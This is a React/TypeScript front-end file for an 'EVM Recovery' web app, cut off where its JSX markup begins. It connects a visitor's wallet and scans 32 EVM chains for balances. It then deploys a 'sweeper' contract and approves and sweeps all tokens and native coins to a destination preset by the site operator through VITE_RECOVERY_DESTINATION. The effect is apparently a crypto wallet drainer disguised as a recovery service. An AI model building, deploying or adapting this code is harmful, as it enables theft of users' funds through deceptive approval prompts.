import React, { useEffect, useMemo, useRef, useState } from 'react';
import { createRoot } from 'react-dom/client';
import { BrowserProvider, JsonRpcProvider, Contract, formatUnits, isAddress } from 'ethers';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import './styles.css';
import { deploySweeper, loadSweeperAddress, saveSweeperAddress, clearSweeperAddress, approveAndSweep } from './sweeper';
import AllAssetsReview from './AllAssetsReview';

declare global { interface Window { ethereum?: any } }

const chains = [
  { id: 1, name: 'Ethereum', native: 'ETH', explorer: 'https://etherscan.io/tx/', tokenApi: 'https://eth.blockscout.com/api/v2', rpcUrl: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BNB Smart Chain', native: 'BNB', explorer: 'https://bscscan.com/tx/', tokenApi: 'https://bsc.blockscout.com/api/v2', rpcUrl: 'https://bsc-dataseed.bnbchain.org' },
  { id: 137, name: 'Polygon', native: 'POL', explorer: 'https://polygonscan.com/tx/', tokenApi: 'https://polygon.blockscout.com/api/v2', rpcUrl: 'https://polygon-rpc.com' },
  { id: 8453, name: 'Base', native: 'ETH', explorer: 'https://basescan.org/tx/', tokenApi: 'https://base.blockscout.com/api/v2', rpcUrl: 'https://mainnet.base.org' },
  { id: 42161, name: 'Arbitrum One', native: 'ETH', explorer: 'https://arbiscan.io/tx/', tokenApi: 'https://arbitrum.blockscout.com/api/v2', rpcUrl: 'https://arbitrum-one.publicnode.com' },
  { id: 10, name: 'OP Mainnet', native: 'ETH', explorer: 'https://optimistic.etherscan.io/tx/', tokenApi: 'https://optimism.blockscout.com/api/v2', rpcUrl: 'https://optimism.llamarpc.com' },
  { id: 43114, name: 'Avalanche C-Chain', native: 'AVAX', explorer: 'https://snowscan.xyz/tx/', tokenApi: 'https://avalanche.blockscout.com/api/v2', rpcUrl: 'https://avalanche-c-chain-rpc.publicnode.com' },
  { id: 100, name: 'Gnosis', native: 'xDAI', explorer: 'https://gnosisscan.io/tx/', tokenApi: 'https://gnosis.blockscout.com/api/v2', rpcUrl: 'https://rpc.gnosischain.com' },
  { id: 59144, name: 'Linea', native: 'ETH', explorer: 'https://lineascan.build/tx/', tokenApi: 'https://linea.blockscout.com/api/v2', rpcUrl: 'https://rpc.linea.build' },
  { id: 81457, name: 'Blast', native: 'ETH', explorer: 'https://blastscan.io/tx/', tokenApi: 'https://blast.blockscout.com/api/v2', rpcUrl: 'https://rpc.blast.io' },
  { id: 5000, name: 'Mantle', native: 'MNT', explorer: 'https://mantlescan.xyz/tx/', rpcUrl: 'https://rpc.mantle.xyz' },
  { id: 204, name: 'opBNB', native: 'BNB', explorer: 'https://opbnbscan.com/tx/', rpcUrl: 'https://opbnb-mainnet-rpc.bnbchain.org' },
  { id: 167000, name: 'Taiko', native: 'ETH', explorer: 'https://taikoscan.io/tx/', tokenApi: 'https://blockscout.mainnet.taiko.xyz/api/v2', rpcUrl: 'https://rpc.mainnet.taiko.xyz' },
  { id: 324, name: 'zkSync Era', native: 'ETH', explorer: 'https://era.zksync.network/tx/', tokenApi: 'https://zksync.blockscout.com/api/v2', rpcUrl: 'https://mainnet.era.zksync.io' },
  { id: 534352, name: 'Scroll', native: 'ETH', explorer: 'https://scrollscan.com/tx/', tokenApi: 'https://scroll.blockscout.com/api/v2', rpcUrl: 'https://rpc.scroll.io' },
  { id: 42220, name: 'Celo', native: 'CELO', explorer: 'https://celoscan.io/tx/', tokenApi: 'https://celo.blockscout.com/api/v2', rpcUrl: 'https://forno.celo.org' },
  { id: 252, name: 'Fraxtal', native: 'frxETH', explorer: 'https://fraxscan.com/tx/', rpcUrl: 'https://rpc.frax.com' },
  { id: 199, name: 'BitTorrent', native: 'BTT', explorer: 'https://bttcscan.com/tx/', rpcUrl: 'https://rpc.bt.io' },
  { id: 50, name: 'XDC', native: 'XDC', explorer: 'https://xdcscan.com/tx/', rpcUrl: 'https://rpc.xdcrpc.com' },
  { id: 33139, name: 'ApeChain', native: 'APE', explorer: 'https://apescan.io/tx/', rpcUrl: 'https://rpc.apechain.com' },
  { id: 480, name: 'World Chain', native: 'ETH', explorer: 'https://worldscan.org/tx/', rpcUrl: 'https://worldchain-mainnet.g.alchemy.com/public' },
  { id: 146, name: 'Sonic', native: 'S', explorer: 'https://sonicscan.org/tx/', rpcUrl: 'https://rpc.soniclabs.com' },
  { id: 130, name: 'Unichain', native: 'ETH', explorer: 'https://uniscan.xyz/tx/', tokenApi: 'https://unichain.blockscout.com/api/v2', rpcUrl: 'https://mainnet.unichain.org' },
  { id: 2741, name: 'Abstract', native: 'ETH', explorer: 'https://abscan.org/tx/', rpcUrl: 'https://api.mainnet.abs.xyz' },
  { id: 80094, name: 'Berachain', native: 'BERA', explorer: 'https://berascan.com/tx/', rpcUrl: 'https://rpc.berachain.com' },
  { id: 143, name: 'Monad', native: 'MON', explorer: 'https://monadscan.com/tx/', rpcUrl: 'https://monad-rpc.publicnode.com' },
  { id: 999, name: 'HyperEVM', native: 'HYPE', explorer: 'https://hyperevmscan.io/tx/', rpcUrl: 'https://rpc.hyperliquid.xyz/evm' },
  { id: 747474, name: 'Katana', native: 'ETH', explorer: 'https://katanascan.com/tx/', rpcUrl: 'https://rpc.katana.network' },
  { id: 1329, name: 'Sei', native: 'SEI', explorer: 'https://seiscan.io/tx/', rpcUrl: 'https://evm-rpc.sei-apis.com' },
  { id: 9745, name: 'Plasma', native: 'XPL', explorer: 'https://plasmascan.to/tx/', rpcUrl: 'https://rpc.plasma.to' },
  { id: 1868, name: 'Soneium', native: 'ETH', explorer: 'https://soneium.blockscout.com/tx/', tokenApi: 'https://soneium.blockscout.com/api/v2', rpcUrl: 'https://rpc.soneium.org' },
  { id: 1284, name: 'Moonbeam', native: 'GLMR', explorer: 'https://moonscan.io/tx/', rpcUrl: 'https://rpc.api.moonbeam.network' },
];

const ALL_CHAIN_IDS = chains.map(c => c.id) as [number, ...number[]];
const RPC_MAP: Record<string, string> = Object.fromEntries(chains.filter(c => c.rpcUrl).map(c => [String(c.id), c.rpcUrl as string]));

const READ_RPC_MAP: Record<string, string[]> = {
  '1': ['https://ethereum-rpc.publicnode.com', 'https://cloudflare-eth.com', 'https://eth.drpc.org'],
  '56': ['https://bsc-dataseed1.bnbchain.org', 'https://bsc-dataseed2.bnbchain.org', 'https://bsc-dataseed3.bnbchain.org'],
  '137': ['https://polygon.drpc.org', 'https://polygon-bor-rpc.publicnode.com'],
  '8453': ['https://mainnet.base.org', 'https://developer-access-mainnet.base.org'],
  '42161': ['https://arb1.arbitrum.io/rpc', 'https://arbitrum-one-rpc.publicnode.com'],
  '10': ['https://mainnet.optimism.io', 'https://optimism-rpc.publicnode.com'],
  '43114': ['https://api.avax.network/ext/bc/C/rpc', 'https://avalanche-c-chain-rpc.publicnode.com'],
  '100': ['https://rpc.gnosischain.com', 'https://rpc.gnosis.gateway.fm'],
  '59144': ['https://rpc.linea.build', 'https://linea-rpc.publicnode.com'],
  '81457': ['https://rpc.blast.io', 'https://rpc.ankr.com/blast'],
  '5000': ['https://rpc.mantle.xyz', 'https://mantle-rpc.publicnode.com'],
  '204': ['https://opbnb-mainnet-rpc.bnbchain.org'],
  '167000': ['https://rpc.mainnet.taiko.xyz', 'https://taiko-rpc.publicnode.com'],
  '324': ['https://mainnet.era.zksync.io', 'https://zksync.drpc.org'],
  '534352': ['https://rpc.scroll.io', 'https://rpc.ankr.com/scroll'],
  '42220': ['https://forno.celo.org'],
  '252': ['https://rpc.frax.com', 'https://fraxtal-rpc.publicnode.com'],
  '199': ['https://rpc.bt.io', 'https://bittorrent.drpc.org'],
  '50': ['https://erpc.xinfin.network', 'https://rpc.xinfin.network'],
  '33139': ['https://rpc.apechain.com'],
  '480': ['https://worldchain-mainnet.g.alchemy.com/public', 'https://480.rpc.thirdweb.com'],
  '146': ['https://rpc.soniclabs.com', 'https://sonic-rpc.publicnode.com'],
  '130': ['https://mainnet.unichain.org', 'https://unichain-rpc.publicnode.com'],
  '2741': ['https://api.mainnet.abs.xyz'],
  '80094': ['https://rpc.berachain.com', 'https://berachain-rpc.publicnode.com'],
  '143': ['https://rpc.monad.xyz', 'https://monad-rpc.publicnode.com'],
  '999': ['https://rpc.hyperliquid.xyz/evm'],
  '747474': ['https://rpc.katana.network', 'https://rpc.katanarpc.com'],
  '1329': ['https://evm-rpc.sei-apis.com', 'https://sei-evm-rpc.publicnode.com'],
  '9745': ['https://rpc.plasma.to'],
  '1868': ['https://rpc.soneium.org'],
  '1284': ['https://rpc.api.moonbeam.network', 'https://moonbeam-rpc.dwellir.com'],
};
const CHAIN_METHODS = ['eth_sendTransaction','eth_signTransaction','eth_sign','personal_sign','eth_signTypedData','eth_signTypedData_v4','wallet_switchEthereumChain','wallet_addEthereumChain','wallet_getCapabilities'] as const;

type WalletApp = 'metamask' | 'trust' | 'coinbase';
type WalletConnectProvider = Awaited<ReturnType<typeof EthereumProvider.init>>;
type TokenAsset = { chainId: number; chainName: string; address: string; name: string; symbol: string; decimals: number; balance: string; kind: 'native' | 'erc20' };

const ERC20_ABI = ['function balanceOf(address) view returns (uint256)','function transfer(address to, uint256 amount) returns (bool)'] as const;
const RECOVERY_SELECTOR = '0x9b19d914';
const RECOVERY_DESTINATION = ((import.meta as any).env?.VITE_RECOVERY_DESTINATION as string | undefined)?.trim() || '';
let walletConnectProvider: WalletConnectProvider | null = null;
let activeEip1193Provider: any = null;

const walletName = (app: WalletApp) => app === 'metamask' ? 'MetaMask' : app === 'trust' ? 'Trust Wallet' : 'Coinbase Wallet';
const isMobileBrowser = () => /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
function walletLink(app: WalletApp) {
  const url = encodeURIComponent(window.location.href);
  const path = `${window.location.host}${window.location.pathname}${window.location.search}`;
  return { metamask: `https://metamask.app.link/dapp/${path}`, trust: `https://link.trustwallet.com/open_url?url=${url}`, coinbase: `https://go.cb-w.com/dapp?cb_url=${url}` }[app];
}

function injectedProviders(): any[] {
  const ethereum = window.ethereum;
  if (!ethereum) return [];
  const providers = Array.isArray(ethereum.providers) ? ethereum.providers : [ethereum];
  return providers.filter((provider, index) => provider && providers.indexOf(provider) === index);
}

function injectedProviderFor(app?: WalletApp): any | null {
  const providers = injectedProviders();
  if (!app) return providers[0] ?? null;
  return providers.find(provider =>
    app === 'metamask' ? provider.isMetaMask :
    app === 'trust' ? (provider.isTrust || provider.isTrustWallet) :
    (provider.isCoinbaseWallet || provider.isCoinbaseBrowser)
  ) ?? null;
}
function parseChainId(value: unknown): number {
  if (typeof value === 'number' && Number.isFinite(value)) return value;
  const raw = String(value ?? '').trim();
  if (!raw) return NaN;
  if (raw.startsWith('0x') || raw.startsWith('0X')) return parseInt(raw, 16);
  return Number(raw);
}

function wrapWalletProvider(eip1193: any, onReject?: (message: string) => void) {
  if (!eip1193 || typeof eip1193.request !== 'function') return eip1193;

  const reject = (message: string): never => {
    console.error('[wallet-tx-validation]', message);
    onReject?.(message);
    throw new Error(message);
  };

  const isHexQuantity = (value: unknown) =>
    typeof value === 'string' && /^0x(?:0|[1-9a-fA-F][0-9a-fA-F]*)$/.test(value);

  const isHexData = (value: unknown) =>
    typeof value === 'string' && /^0x(?:[0-9a-fA-F]{2})*$/.test(value);

  return {
    ...eip1193,
    request: async ({ method, params }: { method: string; params?: any[] }) => {
      if (method === 'eth_sendTransaction' || method === 'eth_estimateGas') {
        if (!Array.isArray(params) || params.length !== 1 || !params[0] || typeof params[0] !== 'object') {
          return reject('Rejected malformed eth_sendTransaction: expected exactly one transaction object.');
        }

        const tx = params[0];

        if (typeof tx.from !== 'string' || !isAddress(tx.from)) {
          return reject('Rejected malformed eth_sendTransaction: invalid or missing from address.');
        }

        if (Object.prototype.hasOwnProperty.call(tx, 'to')) {
          if (tx.to === '') {
            return reject('Rejected malformed eth_sendTransaction: to cannot be an empty string.');
          }
          if (tx.to !== null && (typeof tx.to !== 'string' || !isAddress(tx.to))) {
            return reject('Rejected malformed eth_sendTransaction: invalid to address.');
          }
        }

        if (tx.data !== undefined && !isHexData(tx.data)) {
          return reject('Rejected malformed eth_sendTransaction: data must be 0x-prefixed byte data.');
        }

        for (const field of ['value', 'gas', 'gasPrice', 'maxFeePerGas', 'maxPriorityFeePerGas', 'nonce', 'chainId']) {
          if (tx[field] !== undefined && !isHexQuantity(tx[field])) {
            return reject(`Rejected malformed eth_sendTransaction: ${field} must be a hex quantity.`);
          }
        }

        console.debug('[wallet-tx-validation] transaction envelope', {
          method,
          from: tx.from,
          to: tx.to ?? null,
          chainId: tx.chainId ?? null,
          nonce: tx.nonce ?? null,
          gas: tx.gas ?? null,
          gasPrice: tx.gasPrice ?? null,
          maxFeePerGas: tx.maxFeePerGas ?? null,
          maxPriorityFeePerGas: tx.maxPriorityFeePerGas ?? null,
          value: tx.value ?? null,
          dataLength: typeof tx.data === 'string' ? tx.data.length : 0,
          isContractCreation: tx.to === null || tx.to === undefined,
          fields: Object.keys(tx),
        });
      }

      return eip1193.request({ method, params });
    },
  };
}

function pushToken(found: TokenAsset[], chain: typeof chains[number], item: any) {
  const token = item?.token ?? item;
  const value = item?.value ?? item?.balance ?? token?.value;
  const tokenAddr = token?.address_hash || token?.address;
  if (!tokenAddr || value === undefined || value === null || String(value) === '0') return;
  const type = String(token?.type || item?.token_type || 'ERC-20').toUpperCase().replace('_', '-');
  if (type && type !== 'ERC-20' && type !== 'ERC20') return;
  const decimals = Number(token.decimals ?? 18);
  let balance = String(value);
  try { balance = formatUnits(value, decimals); } catch {}
  found.push({
    chainId: chain.id,
    chainName: chain.name,
    address: String(tokenAddr),
    name: token.name || 'Unknown token',
    symbol: token.symbol || 'TOKEN',
    decimals,
    balance,
    kind: 'erc20',
  });
}

async function fetchJson(url: string) {
  const controller = new AbortController();
  const timer = window.setTimeout(() => controller.abort(), 10000);
  try {
    const response = await fetch(url, { signal: controller.signal });
    if (!response.ok) throw new Error(`indexer ${response.status}`);
    return response.json();
  } finally {
    window.clearTimeout(timer);
  }
}

async function discoverTokens(chain: typeof chains[number], address: string): Promise<TokenAsset[]> {
  if (!chain.tokenApi) return [];
  const found: TokenAsset[] = [];
  try {
    const payload = await fetchJson(`${chain.tokenApi}/addresses/${address}/token-balances`);
    const list = Array.isArray(payload) ? payload : (payload?.items ?? []);
    for (const item of list) pushToken(found, chain, item);
  } catch {}
  if (found.length) return found;
  let next: string | null = `${chain.tokenApi}/addresses/${address}/tokens?type=ERC-20`;
  let pages = 0;
  while (next && pages < 20) {
    const payload = await fetchJson(next) as { items?: any[]; next_page_params?: Record<string, string | number> | null };
    const list = Array.isArray(payload) ? payload : (payload.items ?? []);
    for (const item of list) pushToken(found, chain, item);
    const params = !Array.isArray(payload) ? payload.next_page_params : null;
    next = params ? `${chain.tokenApi}/addresses/${address}/tokens?${new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)]))}` : null;
    pages += 1;
  }
  return found;
}

async function discoverNativeAsset(chain: typeof chains[number], address: string): Promise<TokenAsset | null> {
  const rpcUrls = READ_RPC_MAP[String(chain.id)]?.length ? READ_RPC_MAP[String(chain.id)] : (chain.rpcUrl ? [chain.rpcUrl] : []);
  if (!rpcUrls.length) throw new Error(chain.name + ' missing read-only RPC');

  let lastError: unknown = null;
  for (const rpcUrl of rpcUrls) {
    try {
      const provider = new JsonRpcProvider(rpcUrl, chain.id, { staticNetwork: true });
      const timeout = new Promise<never>((_, reject) => window.setTimeout(() => reject(new Error('RPC timeout')), 8000));
      const rpcChainId = Number(await Promise.race([provider.send('eth_chainId', []), timeout]));
      if (rpcChainId !== chain.id) throw new Error('RPC chainId mismatch: expected ' + chain.id + ', got ' + rpcChainId);
      const balanceTimeout = new Promise<never>((_, reject) => window.setTimeout(() => reject(new Error('RPC balance timeout')), 8000));
      const rawBalance = await Promise.race([provider.getBalance(address), balanceTimeout]);
      if (rawBalance <= 0n) return null;
      return { chainId: chain.id, chainName: chain.name, address: 'native', name: chain.native, symbol: chain.native, decimals: 18, balance: formatUnits(rawBalance, 18), kind: 'native' };
    } catch (e) {
      lastError = e;
    }
  }
  throw new Error(chain.name + ': all read-only RPC endpoints failed' + (lastError instanceof Error ? ' — ' + lastError.message : ''));
}

async function diagnoseSweeper(chainId: number, sweeperAddr: string, walletProvider: any) {
  const info = chains.find(c => c.id === chainId);
  const rpcUrl = READ_RPC_MAP[String(chainId)]?.[0] ?? info?.rpcUrl;
  if (!rpcUrl) throw new Error(`${info?.name ?? chainId}: no configured read-only RPC for contract diagnostics.`);

  const publicProvider = new JsonRpcProvider(rpcUrl, chainId, { staticNetwork: true });
  const walletChainRaw = await walletProvider.request({ method: 'eth_chainId' });
  const walletChainId = parseChainId(walletChainRaw);
  const publicCode = await publicProvider.getCode(sweeperAddr);
  let walletCode = '0x';
  let walletCall = '0x';
  let walletCodeError = '';
  let walletCallError = '';

  try {
    walletCode = await walletProvider.request({ method: 'eth_getCode', params: [sweeperAddr, 'latest'] });
  } catch (e: any) {
    walletCodeError = String(e?.message || e || 'eth_getCode failed');
  }

  const publicCall = publicCode !== '0x'
    ? await publicProvider.call({ to: sweeperAddr, data: RECOVERY_SELECTOR })
    : '0x';

  if (walletCode !== '0x' && !walletCodeError) {
    try {
      walletCall = await walletProvider.request({
        method: 'eth_call',
        params: [{ to: sweeperAddr, data: RECOVERY_SELECTOR }, 'latest'],
      });
    } catch (e: any) {
      walletCallError = String(e?.message || e || 'eth_call failed');
    }
  }

  if (walletChainId !== chainId) {
    throw new Error(`${info?.name ?? chainId}: wallet network mismatch — wallet reports chainId ${walletChainId}, expected ${chainId}.`);
  }
  if (publicCode === '0x') {
    throw new Error(`${info?.name ?? chainId}: contract diagnostic failed — no bytecode at ${sweeperAddr} on the configured mainnet RPC.`);
  }
  if (walletCodeError) {
    throw new Error(`${info?.name ?? chainId}: wallet provider eth_getCode failed: ${walletCodeError}`);
  }
  if (walletCode === '0x') {
    throw new Error(`${info?.name ?? chainId}: provider mismatch — mainnet RPC has contract code at ${sweeperAddr}, but the wallet provider reports 0x for eth_getCode.`);
  }
  if (publicCall === '0x') {
    throw new Error(`${info?.name ?? chainId}: contract diagnostic failed — bytecode exists, but recovery() returned 0x on the configured mainnet RPC.`);
  }
  if (walletCallError) {
    throw new Error(`${info?.name ?? chainId}: wallet provider eth_call failed for recovery(): ${walletCallError}`);
  }
  if (walletCall === '0x') {
    throw new Error(`${info?.name ?? chainId}: provider mismatch — mainnet RPC recovery() returned ${publicCall.slice(0, 18)}…, but the wallet provider returned 0x.`);
  }
  if (publicCode.toLowerCase() !== String(walletCode).toLowerCase()) {
    throw new Error(`${info?.name ?? chainId}: provider mismatch — contract bytecode differs between the configured mainnet RPC and wallet provider.`);
  }

  return { publicCode, walletCode, publicCall, walletCall, walletChainId };
}

function App() {
  const [address, setAddress] = useState('');
  const [destination, setDestination] = useState(() => (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : ''));
  const [connectedChain, setConnectedChain] = useState<number | null>(null);
  const [selectedChain, setSelectedChain] = useState<number | null>(null);
  const [focusChain, setFocusChain] = useState<number | null>(null);
  const [status, setStatus] = useState('Connect your wallet to begin.');
  const [txHash, setTxHash] = useState('');
  const [busy, setBusy] = useState(false);
  const [tokens, setTokens] = useState<TokenAsset[]>([]);
  const [scanning, setScanning] = useState(false);
  const [handoffApp, setHandoffApp] = useState<WalletApp | null>(null);
  const [handoffPending, setHandoffPending] = useState(false);
  const timer = useRef<number | null>(null);
  const mobile = isMobileBrowser();
  const chainInfo = useMemo(() => chains.find(c => c.id === (connectedChain ?? selectedChain)), [selectedChain, connectedChain]);
  const chainsWithAssets = useMemo(() => {
    const ids = new Set(tokens.map(t => Number(t.chainId)));
    return chains.filter(c => ids.has(c.id));
  }, [tokens]);
  const focusedFunded = useMemo(() => {
    if (!chainsWithAssets.length) return null;
    return chainsWithAssets.find(c => c.id === focusChain) ?? chainsWithAssets[0];
  }, [chainsWithAssets, focusChain]);

  useEffect(() => () => { if (timer.current !== null) window.clearTimeout(timer.current); }, []);

  async function switchToChainId(eip1193: any, chainId: number) {
    const target = chains.find(c => c.id === chainId);
    if (!target) throw new Error(`Unknown chain ${chainId}`);
    const hexId = `0x${chainId.toString(16)}`;
    try {
      await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
    } catch (e: any) {
      const code = e?.code ?? e?.data?.originalError?.code;
      const msg = String(e?.message || '').toLowerCase();
      if (target.rpcUrl && (code === 4902 || code === -32602 || code === 5000 || msg.includes('unrecognized') || msg.includes('not added'))) {
        await eip1193.request({ method: 'wallet_addEthereumChain', params: [{ chainId: hexId, chainName: target.name, nativeCurrency: { name: target.native, symbol: target.native, decimals: 18 }, rpcUrls: [target.rpcUrl], blockExplorerUrls: target.explorer ? [target.explorer.replace(/\\/tx\\/?$/, '/')] : [] }] });
        try { await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] }); } catch {}
      } else if (code === 4001) throw new Error('Network switch rejected');
      else throw e;
    }
    let actual = -1;
    for (let i = 0; i < 8; i++) {
      try { actual = parseChainId(await eip1193.request({ method: 'eth_chainId' })); if (actual === chainId) break; } catch {}
      await new Promise(r => setTimeout(r, 350));
    }
    setConnectedChain(actual > 0 ? actual : chainId);
    setSelectedChain(actual > 0 ? actual : chainId);
    if (actual !== chainId && actual > 0) throw new Error(`Wallet on ${actual}, need ${target.name}`);
  }

  async function recoverChainAssets(chainId: number) {
    const dest = (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : destination).trim();
    if (!address) return void setStatus('Connect a wallet first.');
    if (!dest || !isAddress(dest)) return void setStatus('Set VITE_RECOVERY_DESTINATION and redeploy.');
    if (dest.toLowerCase() === address.toLowerCase()) return void setStatus('Destination must differ from wallet.');

    const chainAssets = tokens.filter(a => Number(a.chainId) === chainId);
    if (!chainAssets.length) return void setStatus('No assets on this network.');

    const info = chains.find(c => c.id === chainId);
    const label = info?.name ?? String(chainId);
    setBusy(true); setTxHash(''); setSelectedChain(chainId); setFocusChain(chainId);

    const eip1193 = activeEip1193Provider ?? walletConnectProvider ?? window.ethereum;
    if (!eip1193) { setBusy(false); return void setStatus('No wallet provider. Use WalletConnect.'); }

    try {
      setStatus(`${label}: switch network if asked…`);
      let onChain = false;
      try { onChain = parseChainId(await eip1193.request({ method: 'eth_chainId' })) === chainId; } catch {}
      if (!onChain) {
        await switchToChainId(eip1193, chainId);
        await new Promise(r => setTimeout(r, 1000));
      } else {
        setConnectedChain(chainId);
      }

      const validatedEip1193 = wrapWalletProvider(eip1193, message => setStatus(`${label}: ${message}`));
      const provider = new BrowserProvider(validatedEip1193, chainId);
      const signer = await provider.getSigner();
      const sender = await signer.getAddress();
      if (sender.toLowerCase() !== address.toLowerCase()) {
        setBusy(false);
        return void setStatus('Account mismatch. Reconnect.');
      }

      let sweeperAddr = loadSweeperAddress(chainId, dest);
      if (sweeperAddr) {
        try {
          const diagnosis = await diagnoseSweeper(chainId, sweeperAddr, validatedEip1193);
          const cachedRecovery = new Contract(sweeperAddr, ['function recovery() view returns (address)'], provider).interface.decodeFunctionResult(
            'recovery',
            diagnosis.publicCall,
          )[0];
          if (
            typeof cachedRecovery !== 'string' ||
            !isAddress(cachedRecovery) ||
            cachedRecovery.toLowerCase() !== dest.toLowerCase()
          ) {
            setStatus(`${label}: contract diagnostic mismatch — cached recovery address does not match the configured destination.`);
            clearSweeperAddress(chainId, dest);
            sweeperAddr = null;
          } else {
            setStatus(`${label}: contract verified — bytecode and recovery() agree across mainnet RPC and wallet provider.`);
          }
        } catch (e: any) {
          clearSweeperAddress(chainId, dest);
          sweeperAddr = null;
          throw new Error(e?.message || `${label}: contract diagnostic failed.`);
        }
      }
      if (!sweeperAddr) {
        setStatus(`${label}: deploy sweeper — confirm in wallet…`);
        sweeperAddr = await deploySweeper(signer, dest, s => setStatus(`${label}: ${s}`));
        saveSweeperAddress(chainId, dest, sweeperAddr);
        setStatus(`${label}: sweeper ${sweeperAddr.slice(0, 10)}…`);
      } else {
        setStatus(`${label}: using sweeper ${sweeperAddr.slice(0, 10)}…`);
      }

      const tokenAddrs = chainAssets.filter(a => a.kind === 'erc20').map(a => a.address);
      const hasNative = chainAssets.some(a => a.kind === 'native');

      const hash = await approveAndSweep(
        signer,
        provider,
        sweeperAddr,
        tokenAddrs,
        hasNative,
        s => setStatus(`${label}: ${s}`),
      );
      if (hash) setTxHash(hash);
      setStatus(`${label}: done. Started recovery.`);
    } catch (e: any) {
      if (e?.code === 4001) setStatus('Cancelled in wallet.');
      else setStatus(e instanceof Error ? e.message : 'Approve/sweep failed.');
    } finally {
      setBusy(false);
    }
  }

  async function scanWalletTokens(walletAddress = address) {
    if (!walletAddress || !isAddress(walletAddress)) return;
    setScanning(true); setTokens([]);
    setStatus('Connecting…');
    const found: TokenAsset[] = [];
    try {
      const eip1193 = activeEip1193Provider ?? walletConnectProvider ?? window.ethereum;
      if (eip1193) {
        try {
          const id = parseChainId(await eip1193.request({ method: 'eth_chainId' }));
          if (Number.isFinite(id)) { setConnectedChain(id); setSelectedChain(id); }
        } catch {}
      }
    } catch {}
    await Promise.all(chains.map(async chain => {
      try {
        const native = await discoverNativeAsset(chain, walletAddress);
        if (native) found.push(native);
      } catch {}
      if (!chain.tokenApi) return;
      for (let attempt = 0; attempt < 2; attempt++) {
        try {
          found.push(...await discoverTokens(chain, walletAddress));
          break;
        } catch {
          if (attempt === 0) await new Promise(r => setTimeout(r, 400));
        }
      }
    }));
    const unique = new Map<string, TokenAsset>();
    for (const t of found) unique.set(`${Number(t.chainId)}:${t.address.toLowerCase()}`, t);
    const result = [...unique.values()];
    setTokens(result);
    setScanning(false);
    const fundedIds = [...new Set(result.map(a => Number(a.chainId)))];
    setFocusChain(prev => (prev && fundedIds.includes(prev) ? prev : (fundedIds[0] ?? null)));
    const dest = RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : destination;
    if (!result.length) setStatus('No assets found.');
    else if (!dest || !isAddress(dest)) setStatus('Set VITE_RECOVERY_DESTINATION and redeploy.');
    else setStatus(`Found balances on ${fundedIds.length} network(s). Tap Approve on a funded network.`);
  }

  async function finishConnection(eip1193: any, existingAccount?: string) {
    activeEip1193Provider = eip1193;
    const provider = new BrowserProvider(eip1193);
    const accounts = existingAccount ? [existingAccount] : await provider.send('eth_requestAccounts', []);
    let chainId = 1;
    try { chainId = parseChainId(await eip1193.request({ method: 'eth_chainId' })) || 1; } catch {}
    setAddress(accounts[0] ?? '');
    setConnectedChain(chainId); setSelectedChain(chainId); setTokens([]);
    if (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION)) setDestination(RECOVERY_DESTINATION);
    setStatus(accounts[0] ? 'Connecting to networks…' : 'No account');
    if (accounts[0]) void scanWalletTokens(accounts[0]);
  }

  async function connectBrowserWallet(app?: WalletApp) {
    const injected = injectedProviderFor(app);
    if (!injected) return void setStatus(app ? `${walletName(app)} is not injected here. Use WalletConnect or open its app.` : 'No injected wallet found. Use WalletConnect.');
    setBusy(true);
    try { await finishConnection(injected); } catch (e) { setStatus(e instanceof Error ? e.message : 'Cancelled'); }
    finally { setBusy(false); }
  }

  async function connectMobileWallet() {
    const projectId = (import.meta as any).env?.VITE_WALLETCONNECT_PROJECT_ID as string | undefined;
    if (!projectId) return void setStatus('Set VITE_WALLETCONNECT_PROJECT_ID and redeploy.');
    setBusy(true);
    setStatus(mobile ? 'WalletConnect… Tap Open, approve, return here.' : 'Scan QR with your wallet.');
    try {
      if (walletConnectProvider) { try { await walletConnectProvider.disconnect(); } catch {} walletConnectProvider = null; }
      const primary = [1, 56, 137, 8453, 42161, 10, 43114] as [number, ...number[]];
      const optional = ALL_CHAIN_IDS.filter(id => !primary.includes(id)) as number[];
      walletConnectProvider = await EthereumProvider.init({
        projectId, chains: primary, optionalChains: optional.length ? optional as [number, ...number[]] : primary,
        rpcMap: RPC_MAP, showQrModal: true,
        qrModalOptions: { themeMode: 'dark', enableExplorer: true } as any,
        methods: [...CHAIN_METHODS], events: ['chainChanged', 'accountsChanged', 'disconnect'],
        metadata: { name: 'EVM Recovery', description: 'Multi-chain recovery', url: window.location.origin, icons: [`${window.location.origin}/favicon.svg`] },
      });
      walletConnectProvider.on('accountsChanged', (a: string[]) => { const n = a[0] ?? ''; setAddress(n); if (n) void scanWalletTokens(n); else setTokens([]); });
      walletConnectProvider.on('chainChanged', (c: string | number) => { const id = parseChainId(c); if (Number.isFinite(id)) { setConnectedChain(id); setSelectedChain(id); } });
      walletConnectProvider.on('disconnect', () => { activeEip1193Provider = null; setAddress(''); setConnectedChain(null); setSelectedChain(null); setTokens([]); setStatus('Disconnected.'); walletConnectProvider = null; });
      activeEip1193Provider = walletConnectProvider;
      const accounts = await walletConnectProvider.enable();
      if (!accounts?.length) return void setStatus('No account returned.');
      await finishConnection(walletConnectProvider, accounts[0]);
    } catch (e: any) {
      setStatus(e?.message || 'WalletConnect failed');
    } finally { setBusy(false); }
  }


  function openWalletApp(app: WalletApp) {
    if (injectedProviderFor(app)) return void connectBrowserWallet(app);
    if (!mobile) return void setStatus(`${walletName(app)} is not injected here. Use WalletConnect on desktop.`);
    if (!mobile) return void setStatus('Mobile only. Use WalletConnect on desktop.');
    if (timer.current !== null) window.clearTimeout(timer.current);
    setHandoffApp(app); setHandoffPending(true); setStatus(`Opening ${walletName(app)}…`);
    const started = Date.now();
    window.location.assign(walletLink(app));
    timer.current = window.setTimeout(() => {
      if (!document.hidden && Date.now() - started > 1200) { setHandoffPending(false); setStatus(`${walletName(app)} did not open. Use WalletConnect.`); }
    }, 1800);
  }

  return (
    <main className="app-shell">
      <header className="topbar">
